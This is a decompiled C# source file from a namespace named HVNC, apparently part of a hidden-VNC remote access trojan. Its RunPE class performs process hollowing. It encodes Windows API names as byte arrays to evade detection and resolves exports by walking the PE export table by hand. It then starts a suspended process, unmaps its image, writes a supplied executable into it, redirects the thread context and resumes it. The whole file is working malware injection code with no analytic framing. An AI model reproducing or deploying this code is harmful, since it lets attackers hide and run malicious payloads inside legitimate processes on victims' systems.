using System;
using System.Collections;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace HVNC
{
	// Token: 0x0200000A RID: 10
	public class RunPE
	{
		// Token: 0x06000016 RID: 22 RVA: 0x000022E0 File Offset: 0x000004E0
		private static DelegateInstance CreateApi<DelegateInstance>(string name, string method)
		{
			return Conversions.ToGenericParameter<DelegateInstance>(Marshal.GetDelegateForFunctionPointer((IntPtr)RunPE.GetProcAddress((long)RunPE.GetInternalModuleBaseAddr(name), method), typeof(DelegateInstance)));
		}

		// Token: 0x06000017 RID: 23 RVA: 0x0000231C File Offset: 0x0000051C
		private static IntPtr GetInternalModuleBaseAddr(string ModuleName)
		{
			bool flag = !ModuleName.Contains(".dll");
			if (flag)
			{
				ModuleName += ".dll";
			}
			IntPtr intPtr = 0;
			try
			{
				foreach (object obj in Process.GetCurrentProcess().Modules)
				{
					ProcessModule processModule = (ProcessModule)obj;
					bool flag2 = Operators.CompareString(processModule.ModuleName.ToLower(), ModuleName, false) == 0;
					if (flag2)
					{
						return processModule.BaseAddress;
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			return RunPE.LoadLibrary(ModuleName);
		}

		// Token: 0x06000018 RID: 24 RVA: 0x000023DC File Offset: 0x000005DC
		private static byte[] ReadByteArray(IntPtr Address, int Size)
		{
			byte[] array = new byte[checked(Size - 1 + 1)];
			Marshal.Copy(Address, array, 0, Size);
			return array;
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00002404 File Offset: 0x00000604
		private static long GetProcAddress(long ModuleAddress, string Export)
		{
			byte[] value = null;
			bool flag = IntPtr.Size == 4;
			checked
			{
				if (flag)
				{
					value = RunPE.ReadByteArray((IntPtr)(ModuleAddress + unchecked((long)Marshal.ReadInt32((IntPtr)(checked(ModuleAddress + unchecked((long)Marshal.ReadInt32((IntPtr)(checked(ModuleAddress + 60L)))) + 120L)))) + 24L), 16);
				}
				bool flag2 = IntPtr.Size == 8;
				if (flag2)
				{
					value = RunPE.ReadByteArray((IntPtr)(ModuleAddress + unchecked((long)Marshal.ReadInt32((IntPtr)(checked(ModuleAddress + unchecked((long)Marshal.ReadInt32((IntPtr)(checked(ModuleAddress + 60L)))) + 136L)))) + 24L), 16);
				}
				int num = BitConverter.ToInt32(value, 0);
				for (int i = 0; i <= num; i++)
				{
					int num2 = Marshal.ReadInt32((IntPtr)(unchecked((long)BitConverter.ToInt32(value, 8)) + ModuleAddress + unchecked((long)(checked(i * 4)))));
					string left = Encoding.ASCII.GetString(RunPE.ReadByteArray((IntPtr)(ModuleAddress + unchecked((long)num2)), 64)).Split(new char[1])[0];
					int num3 = (int)BitConverter.ToInt16(RunPE.ReadByteArray((IntPtr)(unchecked((long)BitConverter.ToInt32(value, 12)) + ModuleAddress + unchecked((long)(checked(i * 2)))), 2), 0);
					bool flag3 = Operators.CompareString(left, Export, false) == 0;
					if (flag3)
					{
						return unchecked((long)BitConverter.ToInt32(RunPE.ReadByteArray((IntPtr)(checked(unchecked((long)BitConverter.ToInt32(value, 4)) + ModuleAddress + unchecked((long)(checked(num3 * 4))))), 4), 0)) + ModuleAddress;
					}
				}
				return 0L;
			}
		}

		// Token: 0x0600001A RID: 26 RVA: 0x00002560 File Offset: 0x00000760
		private static bool HandleRun(string path, string cmd, byte[] data, bool compatible)
		{
			string name = RunPE.BytesToStr(new byte[]
			{
				107,
				101,
				114,
				110,
				101,
				108,
				51,
				50,
				46,
				100,
				108,
				108
			});
			string name2 = RunPE.BytesToStr(new byte[]
			{
				110,
				116,
				100,
				108,
				108,
				46,
				100,
				108,
				108
			});
			string method = RunPE.BytesToStr(new byte[]
			{
				67,
				114,
				101,
				97,
				116,
				101,
				80,
				114,
				111,
				99,
				101,
				115,
				115,
				65
			});
			string method2 = RunPE.BytesToStr(new byte[]
			{
				71,
				101,
				116,
				84,
				104,
				114,
				101,
				97,
				100,
				67,
				111,
				110,
				116,
				101,
				120,
				116
			});
			string method3 = RunPE.BytesToStr(new byte[]
			{
				83,
				101,
				116,
				84,
				104,
				114,
				101,
				97,
				100,
				67,
				111,
				110,
				116,
				101,
				120,
				116
			});
			string method4 = RunPE.BytesToStr(new byte[]
			{
				87,
				111,
				119,
				54,
				52,
				71,
				101,
				116,
				84,
				104,
				114,
				101,
				97,
				100,
				67,
				111,
				110,
				116,
				101,
				120,
				116
			});
			string method5 = RunPE.BytesToStr(new byte[]
			{
				87,
				111,
				119,
				54,
				52,
				83,
				101,
				116,
				84,
				104,
				114,
				101,
				97,
				100,
				67,
				111,
				110,
				116,
				101,
				120,
				116
			});
			string method6 = RunPE.BytesToStr(new byte[]
			{
				82,
				101,
				97,
				100,
				80,
				114,
				111,
				99,
				101,
				115,
				115,
				77,
				101,
				109,
				111,
				114,
				121
			});
			string method7 = RunPE.BytesToStr(new byte[]
			{
				87,
				114,
				105,
				116,
				101,
				80,
				114,
				111,
				99,
				101,
				115,
				115,
				77,
				101,
				109,
				111,
				114,
				121
			});
			string method8 = RunPE.BytesToStr(new byte[]
			{
				78,
				116,
				85,
				110,
				109,
				97,
				112,
				86,
				105,
				101,
				119,
				79,
				102,
				83,
				101,
				99,
				116,
				105,
				111,
				110
			});
			string method9 = RunPE.BytesToStr(new byte[]
			{
				86,
				105,
				114,
				116,
				117,
				97,
				108,
				65,
				108,
				108,
				111,
				99,
				69,
				120
			});
			string method10 = RunPE.BytesToStr(new byte[]
			{
				82,
				101,
				115,
				117,
				109,
				101,
				84,
				104,
				114,
				101,
				97,
				100
			});
			RunPE.CP cp = RunPE.CreateApi<RunPE.CP>(name, method);
			RunPE.GTC gtc = RunPE.CreateApi<RunPE.GTC>(name, method2);
			RunPE.W64GTC w64GTC = RunPE.CreateApi<RunPE.W64GTC>(name, method4);
			RunPE.STC stc = RunPE.CreateApi<RunPE.STC>(name, method3);
			RunPE.W64STC w64STC = RunPE.CreateApi<RunPE.W64STC>(name, method5);
			RunPE.RPM rpm = RunPE.CreateApi<RunPE.RPM>(name, method6);
			RunPE.WPM wpm = RunPE.CreateApi<RunPE.WPM>(name, method7);
			RunPE.NTU ntu = RunPE.CreateApi<RunPE.NTU>(name2, method8);
			RunPE.VAE vae = RunPE.CreateApi<RunPE.VAE>(name, method9);
			RunPE.RT rt = RunPE.CreateApi<RunPE.RT>(name, method10);
			string text = string.Format("\"{0}\"", path);
			RunPE.STARTUP_INFORMATION startup_INFORMATION = default(RunPE.STARTUP_INFORMATION);
			RunPE.PROCESS_INFORMATION process_INFORMATION = default(RunPE.PROCESS_INFORMATION);
			checked
			{
				startup_INFORMATION.Size = (uint)Marshal.SizeOf(typeof(RunPE.STARTUP_INFORMATION));
				try
				{
					bool flag = !string.IsNullOrEmpty(cmd);
					if (flag)
					{
						text = text + " " + cmd;
					}
					bool flag2 = !cp(path, text, IntPtr.Zero, IntPtr.Zero, false, 4U, IntPtr.Zero, null, ref startup_INFORMATION, ref process_INFORMATION);
					if (flag2)
					{
						throw new Exception();
					}
					int num = BitConverter.ToInt32(data, 60);
					int num2 = BitConverter.ToInt32(data, num + 52);
					int[] array = new int[179];
					array[0] = 65538;
					bool flag3 = IntPtr.Size == 4;
					if (flag3)
					{
						bool flag4 = !gtc(process_INFORMATION.ThreadHandle, array);
						if (flag4)
						{
							throw new Exception();
						}
					}
					else
					{
						bool flag5 = !w64GTC(process_INFORMATION.ThreadHandle, array);
						if (flag5)
						{
							throw new Exception();
						}
					}
					int num3 = array[41];
					int num4;
					int num5;
					bool flag6 = !rpm(process_INFORMATION.ProcessHandle, num3 + 8, ref num4, 4, ref num5);
					if (flag6)
					{
						throw new Exception();
					}
					bool flag7 = num2 == num4;
					if (flag7)
					{
						bool flag8 = ntu(process_INFORMATION.ProcessHandle, num4) != 0;
						if (flag8)
						{
							throw new Exception();
						}
					}
					int length = BitConverter.ToInt32(data, num + 80);
					int bufferSize = BitConverter.ToInt32(data, num + 84);
					int num6 = vae(process_INFORMATION.ProcessHandle, num2, length, 12288, 64);
					bool flag9 = !compatible && num6 == 0;
					bool flag10;
					if (flag9)
					{
						flag10 = true;
						num6 = vae(process_INFORMATION.ProcessHandle, 0, length, 12288, 64);
					}
					bool flag11 = num6 == 0;
					if (flag11)
					{
						throw new Exception();
					}
					bool flag12 = !wpm(process_INFORMATION.ProcessHandle, num6, data, bufferSize, ref num5);
					if (flag12)
					{
						throw new Exception();
					}
					int num7 = num + 248;
					short num8 = BitConverter.ToInt16(data, num + 6);
					int num9 = (int)(num8 - 1);
					for (int i = 0; i <= num9; i++)
					{
						int num10 = BitConverter.ToInt32(data, num7 + 12);
						int num11 = BitConverter.ToInt32(data, num7 + 16);
						int srcOffset = BitConverter.ToInt32(data, num7 + 20);
						bool flag13 = num11 != 0;
						if (flag13)
						{
							byte[] array2 = new byte[num11 - 1 + 1];
							Buffer.BlockCopy(data, srcOffset, array2, 0, array2.Length);
							bool flag14 = !wpm(process_INFORMATION.ProcessHandle, num6 + num10, array2, array2.Length, ref num5);
							if (flag14)
							{
								throw new Exception();
							}
						}
						num7 += 40;
					}
					byte[] bytes = BitConverter.GetBytes(num6);
					bool flag15 = !wpm(process_INFORMATION.ProcessHandle, num3 + 8, bytes, 4, ref num5);
					if (flag15)
					{
						throw new Exception();
					}
					int num12 = BitConverter.ToInt32(data, num + 40);
					bool flag16 = flag10;
					if (flag16)
					{
						num6 = num2;
					}
					array[44] = num6 + num12;
					bool flag17 = IntPtr.Size == 4;
					if (flag17)
					{
						bool flag18 = !stc(process_INFORMATION.ThreadHandle, array);
						if (flag18)
						{
							throw new Exception();
						}
					}
					else
					{
						bool flag19 = !w64STC(process_INFORMATION.ThreadHandle, array);
						if (flag19)
						{
							throw new Exception();
						}
					}
					bool flag20 = rt(process_INFORMATION.ThreadHandle) == -1;
					if (flag20)
					{
						throw new Exception();
					}
				}
				catch (Exception ex)
				{
					Process processById = Process.GetProcessById((int)process_INFORMATION.ProcessId);
					bool flag21 = processById != null;
					if (flag21)
					{
						processById.Kill();
					}
					return false;
				}
				return true;
			}
		}

		// Token: 0x0600001B RID: 27 RVA: 0x00002ABC File Offset: 0x00000CBC
		public static bool PERun(string path, string cmd, byte[] data, bool compatible)
		{
			bool flag = RunPE.HandleRun(path, cmd, data, compatible);
			if (flag)
			{
			}
			return true;
		}

		// Token: 0x0600001C RID: 28 RVA: 0x00002AE0 File Offset: 0x00000CE0
		private static string BytesToStr(byte[] input)
		{
			return Encoding.Default.GetString(input);
		}

		// Token: 0x0400000A RID: 10
		private static string kernel32 = RunPE.BytesToStr(new byte[]
		{
			107,
			101,
			114,
			110,
			101,
			108,
			51,
			50
		});

		// Token: 0x0400000B RID: 11
		private static string LoadLibraryA = RunPE.BytesToStr(new byte[]
		{
			76,
			111,
			97,
			100,
			76,
			105,
			98,
			114,
			97,
			114,
			121,
			65
		});

		// Token: 0x0400000C RID: 12
		private static readonly RunPE.LoadLibraryAParameters LoadLibrary = RunPE.CreateApi<RunPE.LoadLibraryAParameters>(RunPE.kernel32, RunPE.LoadLibraryA);

		// Token: 0x0200000E RID: 14
		// (Invoke) Token: 0x06000029 RID: 41
		private delegate IntPtr LoadLibraryAParameters(string name);

		// Token: 0x0200000F RID: 15
		// (Invoke) Token: 0x0600002D RID: 45
		private delegate bool CP(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref RunPE.STARTUP_INFORMATION startupInfo, ref RunPE.PROCESS_INFORMATION processInformation);

		// Token: 0x02000010 RID: 16
		// (Invoke) Token: 0x06000031 RID: 49
		private delegate bool GTC(IntPtr thread, int[] context);

		// Token: 0x02000011 RID: 17
		// (Invoke) Token: 0x06000035 RID: 53
		private delegate bool W64GTC(IntPtr thread, int[] context);

		// Token: 0x02000012 RID: 18
		// (Invoke) Token: 0x06000039 RID: 57
		private delegate bool STC(IntPtr thread, int[] context);

		// Token: 0x02000013 RID: 19
		// (Invoke) Token: 0x0600003D RID: 61
		private delegate bool W64STC(IntPtr thread, int[] context);

		// Token: 0x02000014 RID: 20
		// (Invoke) Token: 0x06000041 RID: 65
		private delegate bool RPM(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);

		// Token: 0x02000015 RID: 21
		// (Invoke) Token: 0x06000045 RID: 69
		private delegate bool WPM(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);

		// Token: 0x02000016 RID: 22
		// (Invoke) Token: 0x06000049 RID: 73
		private delegate int NTU(IntPtr process, int baseAddress);

		// Token: 0x02000017 RID: 23
		// (Invoke) Token: 0x0600004D RID: 77
		private delegate int VAE(IntPtr handle, int address, int length, int type, int protect);

		// Token: 0x02000018 RID: 24
		// (Invoke) Token: 0x06000051 RID: 81
		private delegate int RT(IntPtr handle);

		// Token: 0x02000019 RID: 25
		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		private struct PROCESS_INFORMATION
		{
			// Token: 0x0400001D RID: 29
			public IntPtr ProcessHandle;

			// Token: 0x0400001E RID: 30
			public IntPtr ThreadHandle;

			// Token: 0x0400001F RID: 31
			public uint ProcessId;

			// Token: 0x04000020 RID: 32
			public uint ThreadId;
		}

		// Token: 0x0200001A RID: 26
		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		private struct STARTUP_INFORMATION
		{
			// Token: 0x04000021 RID: 33
			public uint Size;

			// Token: 0x04000022 RID: 34
			public string Reserved1;

			// Token: 0x04000023 RID: 35
			public string Desktop;

			// Token: 0x04000024 RID: 36
			public string Title;

			// Token: 0x04000025 RID: 37
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
			public byte[] Misc;

			// Token: 0x04000026 RID: 38
			public IntPtr Reserved2;

			// Token: 0x04000027 RID: 39
			public IntPtr StdInput;

			// Token: 0x04000028 RID: 40
			public IntPtr StdOutput;

			// Token: 0x04000029 RID: 41
			public IntPtr StdError;
		}
	}
}
